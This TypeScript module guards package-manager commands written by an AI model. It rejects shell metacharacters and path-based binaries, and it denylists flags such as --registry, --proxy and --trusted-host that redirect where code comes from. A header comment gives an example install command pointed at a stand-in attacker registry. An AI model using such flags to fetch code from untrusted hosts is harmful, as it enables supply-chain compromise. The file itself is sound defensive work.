/**
 * The two refusals that bracket the grant match for a model-authored argv.
 *
 * `validateArgv` runs FIRST, before any pattern matching, so a malformed
 * token can never be admitted by a `*` in a grant — the allowlist matches
 * argv shapes, and a shape check must reject garbage before a wildcard gets
 * a chance to wave it through. `deniedFlag` runs AFTER the grant match,
 * because a prefix grant (e.g. `bun add*`) gates the verb, not the payload:
 * `bun add x --registry https://attacker.example` still satisfies `bun add*`
 * while quietly changing where the installed code comes from. The verb gate
 * cannot see that — only a payload-aware check after the match can.
 *
 * Do not reorder these two checks, and do not merge them into one pass:
 * a later reader who "simplifies" this into a single sweep silently
 * removes the guarantee that garbage never reaches the allowlist.
 */

// Shell metacharacters that would let an argv element break out of "one
// literal argument" and be reinterpreted by a shell or a naive re-parse
// downstream — even though this path never invokes a shell itself, nothing
// downstream may assume these are absent. Quotes and a backslash are
// included for the same defense-in-depth reason as the rest of this class:
// they are the escaping/quoting primitives a shell or re-parser would use
// to reinterpret the token.
//
// Deliberately EXCLUDED: glob and history characters (`* ? [ ] ! #`).
// `[` and `]` in particular are not a shell-injection vector on their own —
// blocking them would reject `pkg[extra]`, a legitimate and common Python
// install specifier (e.g. `uv add "httpx[http2]"`), turning a correct
// install into a mysterious refusal. Do not "complete the set" by adding
// these back without re-solving that regression.
const METACHARACTERS = /[;&|$`()<>\n\r'"\\]/;

export function validateArgv(argv: unknown): string | undefined {
  if (!Array.isArray(argv)) return "argv must be an array of strings";
  if (argv.length === 0) return "argv must not be empty";
  for (const element of argv) {
    if (typeof element !== "string") return "every argv element must be a string";
    if (element.length === 0) return "argv elements must not be empty";
    if (METACHARACTERS.test(element)) return `argv element contains a shell metacharacter: ${element}`;
    // A leading "~" depends on shell expansion this path never performs, so
    // it would silently resolve to nothing (or to the wrong home directory)
    // rather than to what the model intended.
    if (element.startsWith("~")) return `argv element must not start with "~": ${element}`;
  }
  // argv[0] is the binary. It must resolve through PATH, not through a
  // relative or absolute path — a path lets the model point execution at an
  // arbitrary file it just wrote, which is exactly what the allowlist of
  // known verbs (bun, npm, pip, ...) exists to prevent. This check runs on
  // argv[0] like every other element above, not only on the arguments that
  // follow it — a binary-only exemption would leave a hole an allowlist
  // grant could never close.
  const binary = argv[0] as string;
  if (binary.includes("/") || binary.includes("\\")) {
    return `the command must resolve through PATH, not a path: ${binary}`;
  }
  return undefined;
}

/**
 * Flags that redirect where code comes from, where it lands, or whether an
 * untrusted source is accepted at all.
 *
 * Not a general "unsafe flag" list — it is specifically the set a verb gate
 * cannot see. A prefix grant like `npm install*` approves the verb "install
 * a package the model named"; it says nothing about `--registry`,
 * `--index-url`/`--extra-index-url`, `-g`/`--global`, `--prefix`, or
 * `--config`/`--userconfig`, each of which can point the installer at a
 * different source or a different filesystem location entirely.
 * `--extra-index-url` is included alongside `--index-url` because pip
 * treats it identically for this purpose: it adds a second, attacker-chosen
 * index that a dependency can resolve from, it does not merely replace one.
 * `--trusted-host` (pip) and `--cert` (pip) sit in the same family from the
 * trust side rather than the source side: they change whether a source is
 * *accepted* — `--trusted-host` disables TLS/host verification for a given
 * host, `--cert` swaps the CA bundle used to validate it. `--strict-ssl`
 * and `--cafile` are the same trust-boundary controls in the npm/yarn/bun
 * family; `--ca` is npm's inline-certificate sibling of `--cafile` (a CA
 * cert passed as a string instead of a file path), so it is included for
 * the same reason. `--proxy` and `--https-proxy` belong to the source
 * category, not the trust category: they change the transport endpoint
 * every registry fetch travels through, which is the same outcome as
 * `--registry` reached by a different mechanism — an attacker-controlled
 * proxy MITMs the package fetch whether or not the registry URL itself was
 * rewritten. Blocking `--registry` while permitting `--proxy` would close
 * the front door and leave the side door open. `--noproxy` is included for
 * the mirror-image reason: it routes traffic around a proxy an
 * organization may be relying on as an egress control. `--unsafe-perm` is
 * here for the same reason from the other direction: it removes a safety
 * check on what an installed package's scripts are allowed to do. These
 * are enumerated, not pattern-matched, because the point is precisely that
 * no verb pattern can be trusted to imply their absence.
 *
 * `--client-cert` is deliberately NOT in this list: it presents a
 * credential to a host, it does not change which host is contacted or
 * whether an untrusted host is accepted. That is a different category —
 * widening this list past "changes where code comes from, or whether an
 * untrusted source is accepted" makes the criterion useless.
 */
export const DENIED_FLAGS: readonly string[] = [
  "--registry",
  "--index-url",
  "--extra-index-url",
  "--index",
  "-i",
  "--trusted-host",
  "--cert",
  "--strict-ssl",
  "--cafile",
  "--ca",
  "--proxy",
  "--https-proxy",
  "--noproxy",
  "--config",
  "--userconfig",
  "--global",
  "-g",
  "--prefix",
  "--unsafe-perm",
];

/**
 * Normalizes "--flag=value" to "--flag" so a denylist check does not depend
 * on whether the model wrote the value as a separate token, and lowercases
 * it so a differently-cased spelling (e.g. `--Registry`) can't slip past a
 * case-sensitive list membership check. Shared with `src/tools/package-managers-table.ts`,
 * which screens for a different flag family (workspace-scoping and
 * scripts-control flags) using the same normalization — reuse this rather
 * than writing a second, subtly different matcher.
 */
export function normalizeFlagToken(element: string): string {
  const raw = element.includes("=") ? (element.split("=")[0] as string) : element;
  return raw.toLowerCase();
}

export function deniedFlag(argv: readonly string[]): string | undefined {
  for (const element of argv) {
    const name = normalizeFlagToken(element);
    if (DENIED_FLAGS.includes(name)) return name;
  }
  return undefined;
}
